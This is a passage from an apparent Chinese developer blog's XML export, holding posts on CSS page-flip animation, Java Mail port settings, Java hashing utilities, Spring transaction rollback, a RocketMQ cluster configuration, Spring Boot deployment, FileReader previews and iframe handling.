#colorDiv:hover&#123; background:red; transition:background 5s ; &#125; &lt;/style&gt; &lt;/head&gt;&lt;body&gt;&lt;body&gt;&lt;div class=&quot;demo&quot;&gt; &lt;div class=&quot;pageGroup&quot;&gt; &lt;div class=&quot;page&quot; id=&quot;page1&quot;&gt;1&lt;/div&gt; &lt;div class=&quot;page&quot; id=&quot;page2&quot;&gt;2&lt;/div&gt; &lt;div class=&quot;page&quot; id=&quot;page3&quot;&gt;3&lt;/div&gt; &lt;div class=&quot;page&quot; id=&quot;page4&quot;&gt;4&lt;/div&gt; &lt;div class=&quot;page&quot; id=&quot;page5&quot;&gt;5&lt;/div&gt; &lt;div class=&quot;page&quot; id=&quot;page6&quot;&gt;6&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;op&quot;&gt; &lt;a href=&quot;javascript:prev()&quot;&gt;上一页&lt;/a&gt; &lt;a href=&quot;javascript:next()&quot;&gt;下一页&lt;/a&gt;&amp;nbsp; &lt;/div&gt;&lt;div class=&quot;demo&quot;&gt; &lt;div class=&quot;pageGroup&quot;&gt; &lt;div class=&quot;page&quot; id=&quot;bookpage1&quot;&gt;6&lt;/div&gt; &lt;div class=&quot;page&quot; id=&quot;bookpage2&quot;&gt;5&lt;/div&gt; &lt;div class=&quot;page&quot; id=&quot;bookpage3&quot;&gt;4&lt;/div&gt; &lt;div class=&quot;page&quot; id=&quot;bookpage4&quot;&gt;3&lt;/div&gt; &lt;div class=&quot;page&quot; id=&quot;bookpage5&quot;&gt;2&lt;/div&gt; &lt;div class=&quot;page&quot; id=&quot;bookpage6&quot;&gt;1&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;op&quot;&gt; &lt;a href=&quot;javascript:prev2()&quot;&gt;上一页&lt;/a&gt; &lt;a href=&quot;javascript:next2()&quot;&gt;下一页&lt;/a&gt;&amp;nbsp; &lt;/div&gt;&lt;div id=&quot;mypic&quot;&gt; &lt;img src=&quot;http://www.lrshuai.top/images/logo.jpg&quot;/&gt;&lt;/div&gt;&lt;div class=&quot;widthDemo&quot; id=&quot;demo1&quot;&gt;linear 匀速&lt;/div&gt;&lt;div class=&quot;widthDemo&quot; id=&quot;demo2&quot;&gt;ease 慢-快-慢&lt;/div&gt;&lt;div class=&quot;widthDemo&quot; id=&quot;demo3&quot;&gt;ease-in 慢开始-快结束&lt;/div&gt;&lt;div class=&quot;widthDemo&quot; id=&quot;demo4&quot;&gt;ease-out 慢-快-慢&lt;/div&gt;&lt;div id=&quot;colorDiv&quot;&gt;&lt;/div&gt;&lt;script&gt;curIndex=1;function prev()&#123; if( curIndex == 1)&#123; return; &#125; var curPage = document.getElementById(&quot;page&quot; + curIndex); curPage.style.webkitTransform = &quot;rotateX(90deg)&quot;; curIndex --; var nextPage = document.getElementById(&quot;page&quot; + curIndex); nextPage.style.webkitTransform = &quot;rotateX(0deg)&quot;; &#125;function next()&#123; if( curIndex == 6)&#123; return; &#125; var curPage = document.getElementById(&quot;page&quot; + curIndex); curPage.style.webkitTransform = &quot;rotateX(-90deg)&quot;; curIndex ++; var nextPage = document.getElementById(&quot;page&quot; + curIndex); nextPage.style.webkitTransform = &quot;rotateX(0deg)&quot;; &#125;var bookindex=6;function next2()&#123; if( bookindex == 1)&#123; return; &#125; var curPage = document.getElementById(&quot;bookpage&quot; + bookindex); curPage.style.webkitTransform = &quot;rotateY(-270deg)&quot;; bookindex --; &#125;function prev2()&#123; if( bookindex == 6)&#123; return; &#125; bookindex ++; var curPage = document.getElementById(&quot;bookpage&quot; + bookindex); curPage.style.webkitTransform = &quot;rotateY(0deg)&quot;;&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 正文到此结束，谢谢观看，觉得有用，点个赞可好！]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于使用Java Mail 发邮件，连接超时问题]]></title>
    <url>%2Fblog%2F2017%2F10%2F11%2F%E5%85%B3%E4%BA%8E%E4%BD%BF%E7%94%A8Java%20Mail%20%E5%8F%91%E9%82%AE%E4%BB%B6%EF%BC%8C%E8%BF%9E%E6%8E%A5%E8%B6%85%E6%97%B6%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[异常信息 send mail err:Mail server connection failed; nested exception is com.sun.mail.util.MailConnectException: Couldn’t connect to host, port: smtp.qq.com, 25; timeout -1 在本地windows 是可以发送成功的怀疑是端口问题，好吧，我用的是 25 端口，开了之后还是连接超时。那么就很有可能是你的服务器的运营商将25端口封禁了！换其他端口我直接用springboot 的模板发邮件发邮件可看之前文章默认的配置如下：1234567spring.mail.host=smtp.qq.comspring.mail.username=1006059906@qq.comspring.mail.password=这个是你的授权码spring.mail.properties.mail.smtp.auth=truespring.mail.properties.mail.smtp.starttls.enable=truespring.mail.properties.mail.smtp.starttls.required=truespring.mail.default-encoding=UTF-8 修改端口为4651234567891011spring.mail.host=smtp.qq.comspring.mail.username=1006059906@qq.comspring.mail.password=这个是你的授权码spring.mail.properties.mail.smtp.auth=truespring.mail.properties.mail.smtp.starttls.enable=truespring.mail.properties.mail.smtp.starttls.required=truespring.mail.default-encoding=UTF-8spring.mail.port=465spring.mail.properties.mail.smtp.socketFactory.port = 465spring.mail.properties.mail.smtp.socketFactory.class = javax.net.ssl.SSLSocketFactoryspring.mail.properties.mail.smtp.socketFactory.fallback = false 这样就ok了，springboot 发邮件的示例代码：https://github.com/rstyro/spring-boot/tree/master/springboot-mail]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Spring Boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java加密工具类]]></title>
    <url>%2Fblog%2F2017%2F10%2F10%2FJava%E5%8A%A0%E5%AF%86%E5%B7%A5%E5%85%B7%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[#导包 ##maven依赖1234567891011&lt;!-- jdk--&gt;&lt;dependency&gt; &lt;groupId&gt;commons-codec&lt;/groupId&gt; &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!-- bc --&gt;&lt;dependency&gt;&lt;groupId&gt;org.bouncycastle&lt;/groupId&gt; &lt;artifactId&gt;bcprov-jdk15on&lt;/artifactId&gt; &lt;version&gt;1.58&lt;/version&gt;&lt;/dependency&gt; #代码示例 ##MD5加密算法 示例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667package top.lrshuai.blog.util;import java.security.MessageDigest;import java.security.Security;import org.apache.commons.codec.binary.Hex;import org.apache.commons.codec.digest.DigestUtils;import org.bouncycastle.crypto.Digest;import org.bouncycastle.crypto.digests.MD4Digest;import org.bouncycastle.crypto.digests.MD5Digest;import org.bouncycastle.jce.provider.BouncyCastleProvider;public class MDUtil &#123; private static String key = &quot;www.lrshuai.top&quot;; public static String jdkMD5() throws Exception&#123; MessageDigest md = MessageDigest.getInstance(&quot;MD5&quot;); byte[] mdbyte = md.digest(key.getBytes()); return Hex.encodeHexString(mdbyte); &#125; public static String jdkMD2() throws Exception&#123; MessageDigest md = MessageDigest.getInstance(&quot;MD2&quot;); byte[] mdbyte = md.digest(key.getBytes()); return Hex.encodeHexString(mdbyte); &#125; public static String bcMD4() throws Exception&#123; Security.addProvider(new BouncyCastleProvider()); MessageDigest md = MessageDigest.getInstance(&quot;MD4&quot;); byte[] mdbyte = md.digest(key.getBytes()); return Hex.encodeHexString(mdbyte); &#125; public static String bcMD4Two() throws Exception&#123; Digest digest = new MD4Digest(); digest.update(key.getBytes(), 0,key.getBytes().length); byte[] bcbtyte = new byte[digest.getDigestSize()]; digest.doFinal(bcbtyte, 0); return org.bouncycastle.util.encoders.Hex.toHexString(bcbtyte); &#125; public static String bcMD5() throws Exception&#123; Digest digest = new MD5Digest(); digest.update(key.getBytes(), 0,key.getBytes().length); byte[] bcbtyte = new byte[digest.getDigestSize()]; digest.doFinal(bcbtyte, 0); return org.bouncycastle.util.encoders.Hex.toHexString(bcbtyte); &#125; public static String ccMD5() &#123; return DigestUtils.md5Hex(key.getBytes()); &#125; public static String ccMD2() &#123; return DigestUtils.md2Hex(key.getBytes()); &#125; public static void main(String[] args) throws Exception &#123; System.out.println(jdkMD5()); System.out.println(jdkMD2()); System.out.println(bcMD4()); System.out.println(bcMD4Two()); System.out.println(bcMD5()); System.out.println(ccMD5()); System.out.println(ccMD2()); &#125;&#125; ##SHA1加密算法 示例 ###SHA 分为 ####SHA1 ####SHA2 #####SHA2又分有 SHA-224、SHA-256、SHA-384，和SHA-512。 ###所以SHA 的算法可以说有5种1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package top.lrshuai.blog.util;import java.security.MessageDigest;import java.security.Security;import org.apache.commons.codec.binary.Hex;import org.apache.commons.codec.digest.DigestUtils;import org.bouncycastle.crypto.Digest;import org.bouncycastle.crypto.digests.MD4Digest;import org.bouncycastle.crypto.digests.MD5Digest;import org.bouncycastle.crypto.digests.SHA1Digest;import org.bouncycastle.crypto.digests.SHA224Digest;import org.bouncycastle.jce.provider.BouncyCastleProvider;public class SHAUtil &#123; private static String key = &quot;www.lrshuai.top&quot;; public static String jdkSHA1() throws Exception&#123; MessageDigest md = MessageDigest.getInstance(&quot;SHA&quot;); md.update(key.getBytes()); return Hex.encodeHexString(md.digest()); &#125; public static String bcSHA1() throws Exception&#123; Digest digest = new SHA1Digest(); digest.update(key.getBytes(), 0,key.getBytes().length); byte[] shabtyte = new byte[digest.getDigestSize()]; digest.doFinal(shabtyte, 0); return org.bouncycastle.util.encoders.Hex.toHexString(shabtyte); &#125; public static String bcSHA224() throws Exception&#123; Digest digest = new SHA224Digest(); digest.update(key.getBytes(), 0,key.getBytes().length); byte[] shabtyte = new byte[digest.getDigestSize()]; digest.doFinal(shabtyte, 0); return org.bouncycastle.util.encoders.Hex.toHexString(shabtyte); &#125; public static String bcSHA224Two() throws Exception&#123; Security.addProvider(new BouncyCastleProvider()); MessageDigest md = MessageDigest.getInstance(&quot;SHA-224&quot;); md.update(key.getBytes()); return Hex.encodeHexString(md.digest()); &#125; public static String ccSHA1() &#123; return DigestUtils.sha1Hex(key.getBytes()); &#125; public static String ccSHA2() &#123; return DigestUtils.shaHex(key); &#125; public static void main(String[] args) throws Exception &#123; System.out.println(jdkSHA1()); System.out.println(bcSHA1()); System.out.println(bcSHA224()); System.out.println(bcSHA224Two()); &#125;&#125;]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[程序员的十大无奈]]></title>
    <url>%2Fblog%2F2017%2F10%2F01%2F%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%8D%81%E5%A4%A7%E6%97%A0%E5%A5%88%2F</url>
    <content type="text"><![CDATA[1、有人曾说，做程序员的人，都是疯子，做长了往往入戏太深，成天与代码打交道，话都很少说，所以评论程序员们都是以后连妞都泡不到的人，我听后，我可以这样说，泡妞好比一个方法，他人是学习方法，而程序员呢，是能制造方法。2、做程序员的女朋友幸福不？这个问题记得以前有人问过我女朋友，我当时当场回答那人，我说：“做程序员的女朋友，不一定幸福，而做我的女朋友呢？绝对幸福”所以说呢，事在人为。3、程序员的生活单调不单调？对于生活，我无法用单调这个词来形容，因为每个人都有自己喜欢的生活，可能我呢，喜欢看书，研究程序，听歌，爬山，但其他人不一定。到底什么样的生活不单调呢？我们说不清楚，今天平淡，明天激情，后天浪漫，这个我相信很容易做到，但一年 365 天，有那么多花样供我们娱乐吗？所以呢，人还是坚持在一块领域比较好！4、程序员都不帅？做程序员呢，长期与电脑打交道，天天饱受辐射的摧残，很多人就这么认为，怪了，难道上帝创造人类的时候，总给懂得用脑的人一个丑陋的外表？我想不是吧，每个人的魅力都因不同角色而得到不同的结论。俗话说得好：萝卜白菜各有所爱！5、做程序员累不累？累，真的很累，没办法，我们老爸不是李嘉诚，所以呢，无论我们选择了哪一行累是必须的！6、做程序员好玩不？好玩，真的！如果你的兴趣放在这个领域，绝对好玩，你足以能感受到每一行代码给你带来的满足感与兴奋度！所以说呢，好玩不好玩，不是看行业，而是看自己的兴趣！7、做程序员要学习些什么？这个就比较难回答了，我想也没谁能一一说清楚到底要学哪些吧，问这个问题的一般都是新人，而且他的心我能理解，他自己想程序员，而又有一点顾虑，顾虑自己学不好，而世间往往只有自信才能做到自立，万事开头难，跨出第一步后，我们就知道怎么做了，所以不要浮躁，做就对了！8、做程序员是不是收入很高？如果你出于这一点来做程序员，我相信这个职位满足不了你，你还不如回家砸锅卖铁，之后背着所有财产去澳门压一把大小来的实际，来的迅速！9、做程序员是不是吃青春饭？每样事，只要我们认为是真的，它就一定是真的，反之亦然，如果你愿意，你在这个行业做到 60 岁，也没人反对，只要你努力，什么都能成真！10、每一个好的程序背后都曾有无数个 BUG，有 BUG 是好事，不要害怕，而我们找不到 BUG，那才是害怕的！]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring事务异常回滚问题]]></title>
    <url>%2Fblog%2F2017%2F09%2F26%2FSpring%E4%BA%8B%E5%8A%A1%E5%BC%82%E5%B8%B8%E5%9B%9E%E6%BB%9A%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[Spring try…catch 捕获异常不抛出就不会回滚比如:第一个删除成功了，第二个失败。事务不回滚12345678try &#123; roleDao.delRole(roleId); int i = 1/0; roleDao.delUserRole(roleId);&#125; catch (Exception e) &#123; e.printStackTrace(); log.error(&quot;del role error&quot;, e);&#125; 解决方法：第一种：主动抛出RuntimeException12345678910try &#123; roleDao.delRole(roleId); int i = 1/0; roleDao.delUserRole(roleId);&#125; catch (Exception e) &#123; e.printStackTrace(); log.error(&quot;del role error&quot;, e); throw new RuntimeException();&#125; 第二种：手动回滚（推荐做法）123456789try &#123; roleDao.delRole(roleId); int i = 1/0; roleDao.delUserRole(roleId);&#125; catch (Exception e) &#123; e.printStackTrace(); log.error(&quot;del role error&quot;, e); TransactionAspectSupport.currentTransactionStatus().setRollbackOnly();&#125; spring aop 异常捕获原理：被拦截的方法需显式抛出异常，并不能经任何处理，这样aop代理才能捕获到方法的异常，才能进行回滚，默认情况下aop只捕获runtimeexception的异常，但可以通过]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Rocketmq 配置双主双从]]></title>
    <url>%2Fblog%2F2017%2F09%2F25%2FRocketmq%20%E9%85%8D%E7%BD%AE%E5%8F%8C%E4%B8%BB%E5%8F%8C%E4%BB%8E%2F</url>
    <content type="text"><![CDATA[Rocketmq 配置双Master双Slave 这个配置基本流程和Rocketmq 配置双master 是一样的。具体可参考：http://www.lrshuai.top/atc/show/48 只需要修改第三步骤的配置文件就可。 1、环境#### 4台电脑 192.168.12.132 主（broker-a）,开启nameserver 192.168.12.133 主（broker-b）,开启nameserver 192.168.12.134 从（broker-a） 192.168.12.135 从（broker-b） 2、修改配置文件### 注意： 比如 编译什么的和配置双master 一样我就不重复了。 rocketmq/conf 下的文件说明： 2m-2s-async ———– 异步复制 2m-2s-sync ———— 同步双写 2m-noslave ———— 多master模式 #### 我今天演示的是同步双写，所以修改 2m-2s-sync 目录下的配置文件 broker-a.properties1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#所属集群名字brokerClusterName=rocketmq-cluster#broker名字，注意此处不同的配置文件填写的不一样，如果是broker-a.properties 这里就写broker-a,broker-b.properties 这里就写broker-b,以此类推brokerName=broker-a#强制指定本机IP，需要根据每台机器进行修改。官方介绍可为空，系统默认自动识别，但多网卡时IP地址可能读取错误brokerIP1=192.168.12.132#0 表示 Master， &gt;0 表示 SlavebrokerId=0#nameServer地址，分号分割namesrvAddr=192.168.12.132:9876;192.168.12.133:9876#在发送消息时，自动创建服务器不存在的topic，默认创建的队列数defaultTopicQueueNums=4#是否允许 Broker 自动创建Topic，建议线下开启，线上关闭autoCreateTopicEnable=true#是否允许 Broker 自动创建订阅组，建议线下开启，线上关闭autoCreateSubscriptionGroup=true#Broker 对外服务的监听端口listenPort=10911#删除文件时间点，默认凌晨 0点deleteWhen=00#文件保留时间，默认 48 小时fileReservedTime=120#commitLog每个文件的大小默认1GmapedFileSizeCommitLog=1073741824#ConsumeQueue每个文件默认存30W条，根据业务情况调整mapedFileSizeConsumeQueue=300000#destroyMapedFileIntervalForcibly=120000#redeleteHangedFileInterval=120000#检测物理文件磁盘空间diskMaxUsedSpaceRatio=88#存储路径storePathRootDir=/usr/local/rocketmq/data#commitLog 存储路径storePathCommitLog=/usr/local/rocketmq/data/commitlog#消费队列存储路径存储路径storePathConsumeQueue=/usr/local/rocketmq/data/consumequeue#消息索引存储路径storePathIndex=/usr/local/rocketmq/data/index#checkpoint 文件存储路径storeCheckpoint=/usr/local/rocketmq/data/checkpoint#abort 文件存储路径abortFile=/usr/local/rocketmq/data/abort#限制的消息大小maxMessageSize=65536#flushCommitLogLeastPages=4#flushConsumeQueueLeastPages=2#flushCommitLogThoroughInterval=10000#flushConsumeQueueThoroughInterval=60000#Broker 的角色#- ASYNC_MASTER 异步复制Master#- SYNC_MASTER 同步双写Master#- SLAVEbrokerRole=SYNC_MASTER#刷盘方式#- ASYNC_FLUSH 异步刷盘#- SYNC_FLUSH 同步刷盘flushDiskType=SYNC_FLUSH#checkTransactionMessageEnable=false#发消息线程池数量#sendMessageThreadPoolNums=128#拉消息线程池数量#pullMessageThreadPoolNums=128 broker-a-s.properties1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#所属集群名字brokerClusterName=rocketmq-cluster#broker名字，注意此处不同的配置文件填写的不一样，如果是broker-a.properties 这里就写broker-a,broker-b.properties 这里就写broker-b,以此类推brokerName=broker-a#强制指定本机IP，需要根据每台机器进行修改。官方介绍可为空，系统默认自动识别，但多网卡时IP地址可能读取错误brokerIP1=192.168.12.134#0 表示 Master， &gt;0 表示 SlavebrokerId=1#nameServer地址，分号分割namesrvAddr=192.168.12.132:9876;192.168.12.133:9876#在发送消息时，自动创建服务器不存在的topic，默认创建的队列数defaultTopicQueueNums=4#是否允许 Broker 自动创建Topic，建议线下开启，线上关闭autoCreateTopicEnable=true#是否允许 Broker 自动创建订阅组，建议线下开启，线上关闭autoCreateSubscriptionGroup=true#Broker 对外服务的监听端口listenPort=10911#删除文件时间点，默认凌晨 0点deleteWhen=00#文件保留时间，默认 48 小时fileReservedTime=120#commitLog每个文件的大小默认1GmapedFileSizeCommitLog=1073741824#ConsumeQueue每个文件默认存30W条，根据业务情况调整mapedFileSizeConsumeQueue=300000#destroyMapedFileIntervalForcibly=120000#redeleteHangedFileInterval=120000#检测物理文件磁盘空间diskMaxUsedSpaceRatio=88#存储路径storePathRootDir=/usr/local/rocketmq/data#commitLog 存储路径storePathCommitLog=/usr/local/rocketmq/data/commitlog#消费队列存储路径存储路径storePathConsumeQueue=/usr/local/rocketmq/data/consumequeue#消息索引存储路径storePathIndex=/usr/local/rocketmq/data/index#checkpoint 文件存储路径storeCheckpoint=/usr/local/rocketmq/data/checkpoint#abort 文件存储路径abortFile=/usr/local/rocketmq/data/abort#限制的消息大小maxMessageSize=65536#flushCommitLogLeastPages=4#flushConsumeQueueLeastPages=2#flushCommitLogThoroughInterval=10000#flushConsumeQueueThoroughInterval=60000#Broker 的角色#- ASYNC_MASTER 异步复制Master#- SYNC_MASTER 同步双写Master#- SLAVEbrokerRole=SLAVE#刷盘方式#- ASYNC_FLUSH 异步刷盘#- SYNC_FLUSH 同步刷盘flushDiskType=SYNC_FLUSH#checkTransactionMessageEnable=false#发消息线程池数量#sendMessageThreadPoolNums=128#拉消息线程池数量#pullMessageThreadPoolNums=128 区别在哪呢总修改的地方有： 1、brokerName （broker-a 和broker-b 不一样而已） 2、brokerId 3、brokerRole 4、brokerIP1 （这个配置可选） broker-b.properties 与 broker-a.properties 类似。broker-b-s.properties 与 broker-a-s.properties 类似我就不弄出来了。(a)、broker-b.properties 就是在broker-a.properties 的基础上改 brokerName 就可了(b)、broker-b-s.properties 就是在broker-a-s.properties 的基础上改 brokerName 就可了3、启动和配置双master的方法启动一样 我这里只有两台namesrv,你弄4台更好注意： 开放端口9876 （nameserver 端口）10909（主要是fastRemotingServer服务使用）10911（Broker 对外服务的监听端口）10912 (Master 和Slave同步的数据的端口，)]]></content>
      <categories>
        <category>MQ</category>
      </categories>
      <tags>
        <tag>MQ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring Boot (十)：打包部署]]></title>
    <url>%2Fblog%2F2017%2F09%2F20%2FSpring%20Boot%20(%E5%8D%81)%EF%BC%9A%E6%89%93%E5%8C%85%E9%83%A8%E7%BD%B2%2F</url>
    <content type="text"><![CDATA[springboot 打包与部署一、jar 包 进入命令行模式 ，不管linux 还是windows 都是一样的 1、编译进入项目目录，使用如下命令：12//命令打包（-Dmaven.test.skip=true 跳过测试）mvn clean package -Dmaven.test.skip=true 2.运行当前目录的target 就有一个.jar 文件12#启动命令nohub java -jar xxxx.jar &gt;/dev/null 2&gt;&amp;1 &amp; 二、war 包1、修改package(a)、修改包类型12&lt;!-- &lt;packaging&gt;jar&lt;/packaging&gt; --&gt;&lt;packaging&gt;war&lt;/packaging&gt; (b)、移除内置的tomcat插件123456789101112131415161718&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;!-- 移除tomcat插件 --&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt;&lt;!-- 移除之后会报错，加入下面的依赖 --&gt;&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt; 2、修改启动类继承SpringBootServletInitializer 类，重写configure（）方法123456789101112131415161718192021222324252627package top.lrshuai.blog;import org.mybatis.spring.annotation.MapperScan;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.boot.builder.SpringApplicationBuilder;import org.springframework.boot.context.embedded.ConfigurableEmbeddedServletContainer;import org.springframework.boot.context.embedded.EmbeddedServletContainerCustomizer;import org.springframework.boot.web.servlet.ErrorPage;import org.springframework.boot.web.support.SpringBootServletInitializer;import org.springframework.http.HttpStatus;@SpringBootApplication@MapperScan(&quot;top.lrshuai.blog.dao&quot;)public class Application extends SpringBootServletInitializer&#123; public static void main(String[] args) &#123; SpringApplication.run(Application.class, args); &#125; @Override protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) &#123; // TODO Auto-generated method stub// return super.configure(builder); return builder.sources(this.getClass()); &#125;&#125; 3、编译(a)、和编译jar一样，mvn clean package -Dmaven.test.skip=true(b)、(还有一种，mvn clean install -Dmaven.test.skip=true) 如果是eclipse 则不用mvn 4、部署放入tomcat 的webapps 目录下，启动tomcat,搞定三、可能出现的问题(a)、就是静态文件资源 访问404解决方案：所有链接都写相对路径，可能以前你这样写&lt;link href=&quot;/css/blog.css&quot; rel=&quot;stylesheet&quot; &gt; 就可以了，打包jar 我记得好像是没问题的，但是war就出问题了正解应该是 &lt;link href=&quot;../static/css/blog.css&quot; rel=&quot;stylesheet&quot; th:href=&quot;@{/css/blog.css}&quot;&gt;(b)、另一种是js 的路径，比如发ajax请求。路径也会有问题我的方案：1、页面头部添加这行&lt;meta name=&quot;_ctx&quot; th:content=&quot;@{/}&quot; /&gt;2、js 获取它的路径，1234&lt;script type=&quot;text/javascript&quot;&gt;var _ctx = $(&quot;meta[name=&apos;_ctx&apos;]&quot;).attr(&quot;content&quot;);_ctx = _ctx.substr(0, _ctx.length - 1);&lt;/script&gt; 3、然后在每个ajax 请求的前面加入_ctx 。比如：url = &quot;/article/add&quot; 就改为url = ctx+&quot;/article/add&quot;]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Spring Boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FileReader 获取图片BASE64 代码 并预览]]></title>
    <url>%2Fblog%2F2017%2F09%2F12%2FFileReader%20%E8%8E%B7%E5%8F%96%E5%9B%BE%E7%89%87BASE64%20%E4%BB%A3%E7%A0%81%20%E5%B9%B6%E9%A2%84%E8%A7%88%2F</url>
    <content type="text"><![CDATA[FileReader 获取图片的base64 代码 并预览FileReader ，老实说我也不怎么熟悉。在这里只是记录使用方法。 方法名 参数 描述 abort none 中断读取 readAsBinaryString file（blob） 将文件读取为二进制码 readAsDataURL file（blob） 将文件读取为 DataURL readAsText file, （blob） 将文件读取为文本 FileReader 包含了一套完整的事件模型，用于捕获读取文件时的状态 事件 描述 onabort 中断时触发 onerror 出错时触发 onload 文件读取成功完成时触发 onloadend 读取完成触发，无论成功或失败 onloadstart 读取开始时触发 onprogress 读取中 文件一旦开始读取，无论成功或失败，实例的 result 属性都会被填充。如果读取失败，则 result 的值为 null ，否则即是读取的结果，绝大多数的程序都会在成功读取文件的时候，抓取这个值。demo1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;input type=&quot;file&quot; class=&quot;file&quot; name=&quot;imgfile&quot; id=&quot;imgfile&quot; placeholder=&quot;请选择文件&quot;&gt;&lt;img src=&quot;&quot; id=&quot;showImg&quot; &gt; &lt;script src=&quot;http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;script&gt;var input = document.getElementById(&quot;imgfile&quot;);//检测浏览器是否支持FileReader if (typeof (FileReader) === &apos;undefined&apos;) &#123; result.innerHTML = &quot;抱歉，你的浏览器不支持 FileReader，请使用现代浏览器操作！&quot;; input.setAttribute(&apos;disabled&apos;, &apos;disabled&apos;); &#125; else &#123; //开启监听 input.addEventListener(&apos;change&apos;, readFile, false); &#125;function readFile() &#123; var file = this.files[0]; //限定上传文件的类型，判断是否是图片类型 if (!/image\/\w+/.test(file.type)) &#123; alert(&quot;只能选择图片&quot;); return false; &#125; var reader = new FileReader(); reader.readAsDataURL(file); reader.onload = function (e) &#123; base64Code=this.result; //把得到的base64赋值到img标签显示 $(&quot;#showImg&quot;).attr(&quot;src&quot;,base64Code); &#125; &#125;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Iframe 框架的一些笔记]]></title>
    <url>%2Fblog%2F2017%2F08%2F25%2FIframe%20%E6%A1%86%E6%9E%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[一、Iframe 的自适应方法：1234567891011121314151617181920212223&lt;iframe name=&quot;mainFrame&quot; id=&quot;mainBodyFrame&quot; src=&quot;/main&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot; width=&quot;100%&quot; height=&quot;900px&quot; onload=&quot;setIframeHeight(this)&quot;&gt;&lt;/iframe&gt; &lt;script type=&quot;text/javascript&quot;&gt; //iframe 自适应function setIframeHeight(iframe) &#123; if (iframe) &#123; var iframeWin = iframe.contentWindow || iframe.contentDocument.parentWindow; if (iframeWin.document.body) &#123; iframe.height = iframeWin.document.documentElement.scrollHeight || iframeWin.document.body.scrollHeight; &#125; &#125;&#125;; //mainBodyFrame就是iframe 的id window.onload = function() &#123; setIframeHeight(document.getElementById(&apos;mainBodyFrame&apos;));&#125;;&lt;/script&gt; 二、刷新页面12345678//刷新本页：&lt;script language=javascript&gt;window.location.href=window.location.href;&lt;/script&gt; //刷新父页：&lt;script language=javascript&gt;opener.location.href=opener.location.href;&lt;/script&gt; //转到指定页:&lt;script language=javascript&gt;window.location.href=&apos;yourpage.aspx&apos;;&lt;/script&gt; 三、top.location.href和localtion.href有什么不同1234567891011//在顶层页面打开url（跳出框架）top.location.href=”url” // 仅在本页面打开url地址self.location.href=”url” //在父窗口打开Url地址 parent.location.href=”url” //用法和self的用法一致 this.location.href=”url” top.location.href 可以用在当后台使用iframe 框架作为主体显示部分时，当用户身份过期，需要登陆，登录页面会在iframe显示，而登录成功后还是在ifrmae 中显示，如下图： 解决方法：123456&lt;script type=&quot;text/javascript&quot;&gt; //TOCMAT重启之后 在ifrme框架登录后，重新跳出框架显示页面 if (window != top) &#123; top.location.href = location.href; &#125;&lt;/script&gt; 四、jquery动态加载html页面1234567891011&lt;script type=&quot;text/javascript&quot;&gt; $(function() &#123; //在id为admin-left 中加载left.html页面 $.get(&quot;/include/left.html&quot;, function(data) &#123; $(&quot;#admin-left&quot;).html(data); &#125;); &#125;) &lt;/script&gt;]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[服务器 搭建vpn]]></title>
